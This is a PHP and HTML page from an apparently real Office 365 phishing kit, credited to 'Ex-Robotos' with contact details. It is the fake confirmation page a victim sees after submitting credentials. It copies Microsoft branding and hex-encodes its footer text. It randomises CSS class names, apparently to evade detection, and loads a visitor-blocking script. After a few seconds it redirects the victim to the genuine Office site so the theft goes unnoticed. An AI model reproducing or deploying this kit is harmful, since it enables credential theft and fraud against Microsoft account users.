<?php
/* 
OFFICE365 Scmpage V2 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
error_reporting(0);include('blocker.php');include('config.php');
function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" lang="en">

<head>
    <title>Success</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">

    <link rel="shortcut icon" href="images/favicon.ico">
    <link href="css/conv.css" rel="stylesheet">

</head>

<body>
<a href="<?=$officeLink?>" class="<?=$rndString1?>" rel="noreferrer" id="autoclick"></a>    

    
    
<style>
.ms-logo {
  margin-left: 30px;
  display: inline-block;
  background: #F25022;
  width: 11px;
  height: 11px;
  box-shadow: 12px 0 0 #7FBA00, 0 12px 0 #00A4EF, 12px 12px 0 #FFB900;
  transform: translatex(-300%);
}
.ms-logo::after {
  content: 'Microsoft';
  /*font-family: 'Segoe Pro', 'Segoe UI', 'Open Sans', sans-serif;
  font-weight: 600;*/
  font: bold 20px sans-serif;
  margin-left: 28px;
  color: #737373;
}


.container {
  width: 300px;
  margin: 50px auto;
}

.svg-success {
  display: inline-block;
  vertical-align: top;
  height: 300px;
  width: 300px;
  opacity: 1;
  overflow: visible;
}
@-webkit-keyframes success-tick {
  0% {
    stroke-dashoffset: 16px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 31px;
    opacity: 1;
  }
}
@keyframes success-tick {
  0% {
    stroke-dashoffset: 16px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 31px;
    opacity: 1;
  }
}
@-webkit-keyframes success-circle-outline {
  0% {
    stroke-dashoffset: 72px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 0px;
    opacity: 1;
  }
}
@keyframes success-circle-outline {
  0% {
    stroke-dashoffset: 72px;
    opacity: 1;
  }
  100% {
    stroke-dashoffset: 0px;
    opacity: 1;
  }
}
@-webkit-keyframes success-circle-fill {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
@keyframes success-circle-fill {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
.svg-success .success-tick {
  fill: none;
  stroke-width: 1px;
  stroke: #ffffff;
  stroke-dasharray: 15px, 15px;
  stroke-dashoffset: -14px;
  -webkit-animation: success-tick 450ms ease 1400ms forwards;
          animation: success-tick 450ms ease 1400ms forwards;
  opacity: 0;
}
.svg-success .success-circle-outline {
  fill: none;
  stroke-width: 1px;
  stroke: #81c038;
  stroke-dasharray: 72px, 72px;
  stroke-dashoffset: 72px;
  -webkit-animation: success-circle-outline 300ms ease-in-out 800ms forwards;
          animation: success-circle-outline 300ms ease-in-out 800ms forwards;
  opacity: 0;
}
.svg-success .success-circle-fill {
  fill: #81c038;
  stroke: none;
  opacity: 0;
  -webkit-animation: success-circle-fill 300ms ease-out 1100ms forwards;
          animation: success-circle-fill 300ms ease-out 1100ms forwards;
}
@media screen and (-ms-high-contrast: active), screen and (-ms-high-contrast: none) {
  .svg-success .success-tick {
    stroke-dasharray: 0;
    stroke-dashoffset: 0;
    -webkit-animation: none;
            animation: none;
    opacity: 1;
  }
  .svg-success .success-circle-outline {
    stroke-dasharray: 0;
    stroke-dashoffset: 0;
    -webkit-animation: none;
            animation: none;
    opacity: 1;
  }
  .svg-success .success-circle-fill {
    -webkit-animation: none;
            animation: none;
    opacity: 1;
  }
}

</style>
    <div>
        <div class="outer <?=$rndString2?>">
            <div class="middle <?=$rndString3?>">
                <div class="inner relative <?=$rndString4?>">
                       <div class="ms-logo"></div>

                    <div class="row text-title <?=$rndString1?>" style="font-weight: unset;font-size: 1.2rem;" role="heading"><?if(isset($successMsg)){echo $successMsg;}else{echo 'Successfully confirmed. Redirecting to home page ...';}?></div>
                        
                        
<div class="container">  
  
  <svg xmlns="http://www.w3.org/2000/svg" class="svg-success" viewBox="0 0 24 24">
    <g stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10">
      <circle class="success-circle-outline" cx="12" cy="12" r="11.5"/>
      <circle class="success-circle-fill" cx="12" cy="12" r="11.5"/>
      <polyline class="success-tick" points="17,8.5 9.5,15.5 7,13"/>
    </g>
  </svg>
  
</div>



                </div>
            </div>
        </div>

        <div class="footer default <?=$rndString2?>">
            <div id="footerLinks" class="footerNode text-secondary <?=$rndString3?>">
                    <div class="footerNode <?=$rndString4?>">
                        <span>
&#xA9;&#x32;&#x30;&#x31;&#x39;&#x20;&#x4D;&#x69;&#x63;&#x72;&#x6F;&#x73;&#x6F;&#x66;&#x74;                        </span>
                        <a href="#" target="_blank">&#x54;&#x65;&#x72;&#x6D;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x75;&#x73;&#x65;</a>
                        <a href="#" target="_blank">&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x26;&#x20;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x73;</a>
                    </div>
            </div>
        </div>
    </div>
        <script type="text/javascript">


setTimeout(function(){
            window.location.href = '<?=$officeLink?>';
         }, 5000);

setTimeout(function(){
document.getElementById('autoclick').click();
         }, 3000);
</script>
    
</body>
</html>